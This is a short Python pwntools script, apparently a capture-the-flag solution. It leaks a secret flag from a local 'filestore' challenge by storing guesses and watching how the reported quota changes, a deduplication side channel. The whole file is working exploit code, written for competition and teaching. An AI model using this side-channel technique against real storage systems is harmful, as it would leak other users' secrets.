# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

charset = string.ascii_letters + string.digits + "{}_"

r = process(["python3", "filestore.py"])
r.sendline("store")
r.sendline("#"*16 + "X")
r.recvuntil("Stored")

def getquota():
    r.sendline("status")
    r.recvuntil("Quota:")
    s = r.recvline()
    return float(s.strip().split(b"kB")[0].decode())

quota = getquota()
flag = ""
while True:
    good = False
    for ch in charset:
        r.sendline("store")
        r.sendline(ch + flag + "#" * 16)
        r.recvuntil("Stored")
        q2 = getquota()
        diff = q2 - quota
        quota = q2
        if diff < 0.008:
            flag = ch + flag
            print(flag)
            good = True
            break
    if not good:
        break


print(quota)
